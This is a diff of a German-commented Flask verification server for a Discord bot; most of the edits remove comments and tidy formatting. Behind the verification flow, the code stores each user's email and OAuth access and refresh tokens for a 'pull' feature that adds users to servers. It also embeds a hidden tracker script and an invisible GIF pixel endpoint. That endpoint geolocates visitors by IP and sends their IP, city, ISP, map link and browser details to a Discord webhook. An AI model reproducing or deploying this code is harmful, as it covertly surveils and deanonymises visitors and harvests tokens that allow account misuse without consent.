@@ -16,14 +16,14 @@ GUILD_ID = os.environ.get("GUILD_ID", "")
 
 # PUBLIC_URL: Fallback auf RENDER_EXTERNAL_URL (setzt Render automatisch!)
 PUBLIC_URL = os.environ.get("PUBLIC_URL", "") or os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
-PUBLIC_URL = PUBLIC_URL.rstrip("/")  # Schrägstrich am Ende entfernen
+PUBLIC_URL = PUBLIC_URL.rstrip("/")
 
 ALLOWED_SERVERS_STR = os.environ.get("ALLOWED_SERVERS", GUILD_ID)
 ALLOWED_SERVERS = [int(x) for x in ALLOWED_SERVERS_STR.split(",") if x.strip().isdigit()]
 
 REDIRECT_URI = f"{PUBLIC_URL}/callback"
 
-# ---- Tracker-Snippet: sendBeacon blockiert das Seiten-Rendering NICHT mehr ----
+# ---- Tracker-Snippet: sendBeacon blockiert das Seiten-Rendering NICHT ----
 TRACKER_SNIPPET = """
 <script>
 (function () {
@@ -49,9 +49,7 @@ TRACKER_SNIPPET = """
 </script>
 """ % PUBLIC_URL
 
-# ---- Webhook für den Besucher-Logger ----
 SITE_WEBHOOK_URL = os.environ.get("SITE_WEBHOOK_URL", "")
-# Optionaler Schutz gegen Spam: wenn gesetzt, muss /log?key=... mitgegeben werden
 SITE_LOG_KEY = os.environ.get("SITE_LOG_KEY", "")
 
 # ---- Geo-Cache: ip -> (zeitstempel, geo_dict), 1 Stunde gültig ----
@@ -59,7 +57,7 @@ _geo_cache = {}
 GEO_CACHE_TTL = 3600
 
 # ============================================================
-# STARTUP-DIAGNOSE (erscheint im Render-Log)
+# STARTUP-DIAGNOSE
 # ============================================================
 print("=" * 60)
 print("VERIFY-SERVER STARTUP-DIAGNOSE")
@@ -72,7 +70,6 @@ print(f"PUBLIC_URL:      {PUBLIC_URL}")
 print(f"REDIRECT_URI:    {REDIRECT_URI}")
 print(f"SITE_WEBHOOK_URL gesetzt: {bool(SITE_WEBHOOK_URL)}")
 print(f"SITE_LOG_KEY     gesetzt: {bool(SITE_LOG_KEY)}")
-print("OAuth-Scope muss im Developer Portal 'guilds.join' enthalten (für Pull-Feature)")
 if not CLIENT_ID or not CLIENT_SECRET:
     print("!!! WARNUNG: CLIENT_ID/CLIENT_SECRET fehlen -> Token-Tausch wird mit 400 fehlschlagen!")
 if not ALLOWED_SERVERS:
@@ -98,9 +95,9 @@ CLIENT_SECRET gesetzt: <b>{'JA' if CLIENT_SECRET else 'NEIN'}</b></p>
 <p><a href="/debug">→ Debug-Übersicht öffnen</a></p>
 {TRACKER_SNIPPET}"""
 
+
 @app.route("/debug")
 def debug():
-    """Zeigt, was der Server wirklich sieht (keine Secrets, nur ob gesetzt)."""
     return {
         "env_gesetzt": {
             "CLIENT_ID": bool(CLIENT_ID),
@@ -135,14 +132,13 @@ def callback():
     state = request.args.get("state")
     error = request.args.get("error")
 
-    print(f"[CALLBACK] Aufgerufen. code={'JA' if code else 'NEIN'}, state={'JA' if state else 'NEIN'}, error={error}")
+    print(f"[CALLBACK] code={'JA' if code else 'NEIN'}, state={'JA' if state else 'NEIN'}, error={error}")
 
     if error:
         return error_page("Fehler", f"Discord-Fehler: {error}. Klicke erneut auf Verifizieren.")
     if not code or not state:
         return error_page("Fehler", "Code oder State fehlt.")
 
-    # OAuth2: Code gegen Access-Token tauschen
     data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
@@ -152,33 +148,22 @@ def callback():
     }
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-    print(f"[CALLBACK] Token-Tausch gegen Discord ... redirect_uri={REDIRECT_URI}")
     try:
-        resp = requests.post(
-            "https://discord.com/api/oauth2/token",
-            data=data, headers=headers, timeout=15
-        )
-        print(f"[CALLBACK] Discord antwortet: Status {resp.status_code} | {resp.text[:300]}")
-
+        resp = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers, timeout=15)
         if resp.status_code != 200:
             try:
                 err = resp.json().get("error", resp.text)
             except Exception:
                 err = resp.text
             hint = oauth_error_hint(err)
-            return error_page(
-                "OAuth2-Fehler",
-                f"<b>Status:</b> {resp.status_code}<br>"
-                f"<b>Grund:</b> <code>{err}</code><br><br>"
-                f"<b>Hinweis:</b> {hint}"
-            )
+            return error_page("OAuth2-Fehler",
+                              f"<b>Status:</b> {resp.status_code}<br><b>Grund:</b> <code>{err}</code><br><br><b>Hinweis:</b> {hint}")
 
         token_data = resp.json()
         access_token = token_data.get("access_token")
         if not access_token:
             return error_page("Fehler", "Kein Access-Token erhalten.")
 
-        # User-Info + Guilds abrufen
         auth_headers = {"Authorization": f"Bearer {access_token}"}
         me = requests.get("https://discord.com/api/users/@me", headers=auth_headers, timeout=10).json()
         guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=auth_headers, timeout=10).json()
@@ -187,8 +172,6 @@ def callback():
         email = me.get("email", "")
         verified = me.get("verified", False)
 
-        print(f"[CALLBACK] User gefunden: id={user_id}, email={'ja' if email else 'NEIN'}, verified={verified}")
-
         if not user_id:
             return error_page("Fehler", "Konnte User-ID nicht ermitteln.")
 
@@ -196,17 +179,16 @@ def callback():
         if not email or not verified:
             results[state] = {"user_id": int(user_id), "status": "error", "reason": "email_not_verified"}
             return error_page("E-Mail nicht verifiziert",
-                "Bestätige deine E-Mail zuerst in den Discord-Einstellungen (Discord → Benutzereinstellungen → Konto).")
+                              "Bestätige deine E-Mail zuerst in den Discord-Einstellungen (Konto → E-Mail).")
 
         # 2. Server-Check
         user_guild_ids = {int(g["id"]) for g in guilds if g.get("id")}
         if not (user_guild_ids & set(ALLOWED_SERVERS)):
             results[state] = {"user_id": int(user_id), "status": "error", "reason": "not_on_server"}
             return error_page("Nicht auf dem Server",
-                "Du bist auf keinem der erlaubten Server. Tritt dem Server erst bei und klicke dann erneut auf Verifizieren.")
+                              "Du bist auf keinem der erlaubten Server. Tritt dem Server erst bei und klicke dann erneut auf Verifizieren.")
 
-        # ✅ Erfolg – alle Daten für den Bot speichern (die Seite zeigt sie NICHT an!)
-        # access_token / refresh_token werden für das Pull-Feature (guilds.join) mitgegeben.
+        # ✅ Erfolg – Daten (inkl. Pull-Token) für den Bot speichern
         results[state] = {
             "status": "success",
             "user_id": int(user_id),
@@ -221,7 +203,7 @@ def callback():
             "refresh_token": token_data.get("refresh_token", ""),
             "expires_in": token_data.get("expires_in", 604800),
         }
-        print(f"[CALLBACK] ✅ Erfolg gespeichert für state {state}")
+        print(f"[CALLBACK] ✅ Erfolg für state {state}")
         return success_page()
 
     except Exception as e:
@@ -231,11 +213,9 @@ def callback():
 
 @app.route("/check")
 def check_state():
-    """Wird vom Bot alle 5 Sekunden gepollt."""
     state = request.args.get("state")
     if not state:
         return {"status": "no_state"}, 400
-
     result = results.get(state)
     if result is None:
         return {"status": "pending"}
@@ -250,7 +230,6 @@ def _send_visitor_log(data):
     try:
         ip = data["ip"]
 
-        # Geo-Infos (gecacht, 1 Stunde, spart ip-api-Limit 45 req/min)
         geo = {}
         now = time.time()
         cached = _geo_cache.get(ip)
@@ -273,19 +252,19 @@ def _send_visitor_log(data):
         map_link = f"https://www.google.com/maps?q={lat},{lon}" if lat is not None and lon is not None else None
 
         fields = [
-            {"name": "🛡️ IP-Adresse",  "value": f"`{ip}`", "inline": True},
-            {"name": "🌍 Land",        "value": f"{geo.get('country', '?')} {geo.get('countryCode', '')}".strip(), "inline": True},
-            {"name": "🏙️ Stadt",       "value": geo.get("city", "?"), "inline": True},
-            {"name": "🏢 ISP",         "value": geo.get("isp", "?")[:1024], "inline": True},
-            {"name": "🗺️ Karte",       "value": f"[Google Maps]({map_link})" if map_link else "–", "inline": True},
-            {"name": "🧭 Server-TZ",   "value": geo.get("timezone", "?"), "inline": True},
-            {"name": "🕒 Browser-TZ",  "value": data["tz"], "inline": True},
-            {"name": "📄 Seite",       "value": f"{data['host']}{data['page']}"},
-            {"name": "💻 User-Agent",  "value": data["ua"]},
-            {"name": "🔗 Referrer",    "value": data["ref"]},
-            {"name": "🖥️ Auflösung",   "value": data["screen"], "inline": True},
-            {"name": "🗣️ Sprache",     "value": data["lang"], "inline": True},
-            {"name": "⏰ Serverzeit",   "value": time.strftime("%d.%m.%Y %H:%M:%S"), "inline": True},
+            {"name": "🛡️ IP-Adresse", "value": f"`{ip}`", "inline": True},
+            {"name": "🌍 Land", "value": f"{geo.get('country', '?')} {geo.get('countryCode', '')}".strip(), "inline": True},
+            {"name": "🏙️ Stadt", "value": geo.get("city", "?"), "inline": True},
+            {"name": "🏢 ISP", "value": geo.get("isp", "?")[:1024], "inline": True},
+            {"name": "🗺️ Karte", "value": f"[Google Maps]({map_link})" if map_link else "–", "inline": True},
+            {"name": "🧭 Server-TZ", "value": geo.get("timezone", "?"), "inline": True},
+            {"name": "🕒 Browser-TZ", "value": data["tz"], "inline": True},
+            {"name": "📄 Seite", "value": f"{data['host']}{data['page']}"},
+            {"name": "💻 User-Agent", "value": data["ua"]},
+            {"name": "🔗 Referrer", "value": data["ref"]},
+            {"name": "🖥️ Auflösung", "value": data["screen"], "inline": True},
+            {"name": "🗣️ Sprache", "value": data["lang"], "inline": True},
+            {"name": "⏰ Serverzeit", "value": time.strftime("%d.%m.%Y %H:%M:%S"), "inline": True},
         ]
 
         payload = {
@@ -318,11 +297,9 @@ def log_visitor():
     if not SITE_WEBHOOK_URL:
         return "kein Webhook konfiguriert", 503
 
-    # Optionaler Spam-Schutz: ?key= muss stimmen, falls SITE_LOG_KEY gesetzt ist
     if SITE_LOG_KEY and request.args.get("key") != SITE_LOG_KEY:
         return "forbidden", 403
 
-    # IP ermitteln (Render sitzt hinter einem Proxy -> X-Forwarded-For)
     ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip() \
          or request.remote_addr or "Unbekannt"
 
@@ -338,10 +315,8 @@ def log_visitor():
         "tz": (q.get("tz") or "?")[:128],
     }
 
-    # Hintergrund-Thread starten (daemon=True => stirbt mit dem Prozess)
     threading.Thread(target=_send_visitor_log, args=(payload_data,), daemon=True).start()
 
-    # Als unsichtbares Tracking-Pixel nutzbar (z. B. <img src="/log">)
     if "image/" in request.headers.get("Accept", ""):
         gif = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
         return Response(gif, mimetype="image/gif")
@@ -353,7 +328,6 @@ def log_visitor():
 # SEITEN-DESIGN
 # ============================================================
 def success_page():
-    """Schöne Erfolgsseite – OHNE E-Mail, OHNE Username."""
     return """<!doctype html>
 <html lang="de">
 <head>
@@ -370,21 +344,14 @@ def success_page():
     padding: 20px;
   }
   .card {
-    background: #ffffff;
-    border-radius: 24px;
-    padding: 48px 56px;
-    max-width: 480px;
-    width: 100%;
-    text-align: center;
-    box-shadow: 0 25px 60px rgba(0,0,0,.35);
-    animation: pop .5s ease;
+    background: #ffffff; border-radius: 24px; padding: 48px 56px;
+    max-width: 480px; width: 100%; text-align: center;
+    box-shadow: 0 25px 60px rgba(0,0,0,.35); animation: pop .5s ease;
   }
   @keyframes pop { from { transform: scale(.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
   .check {
-    width: 96px; height: 96px;
-    margin: 0 auto 24px;
-    background: #22c55e;
-    border-radius: 50%;
+    width: 96px; height: 96px; margin: 0 auto 24px;
+    background: #22c55e; border-radius: 50%;
     display: flex; align-items: center; justify-content: center;
     animation: bounce 1.4s ease infinite;
   }
@@ -410,7 +377,7 @@ def success_page():
     <h1>Du hast dich erfolgreich verifiziert ✅</h1>
     <p>Dein Konto wurde bestätigt.<br>Du kannst dieses Fenster jetzt schließen.</p>
     <a class="btn" href="https://discord.com/channels/__GUILD_ID__">Zurück zu Discord</a>
-</div>
+  </div>
 """ + TRACKER_SNIPPET + """
 </body>
 </html>""".replace("__GUILD_ID__", GUILD_ID or "")
@@ -433,19 +400,13 @@ def error_page(title, text):
     padding: 20px;
   }}
   .card {{
-    background: #ffffff;
-    border-radius: 24px;
-    padding: 40px 48px;
-    max-width: 480px;
-    width: 100%;
-    text-align: center;
+    background: #ffffff; border-radius: 24px; padding: 40px 48px;
+    max-width: 480px; width: 100%; text-align: center;
     box-shadow: 0 25px 60px rgba(0,0,0,.35);
   }}
   .icon {{
-    width: 80px; height: 80px;
-    margin: 0 auto 20px;
-    background: #ef4444;
-    border-radius: 50%;
+    width: 80px; height: 80px; margin: 0 auto 20px;
+    background: #ef4444; border-radius: 50%;
     display: flex; align-items: center; justify-content: center;
   }}
   .icon svg {{ width: 40px; height: 40px; }}
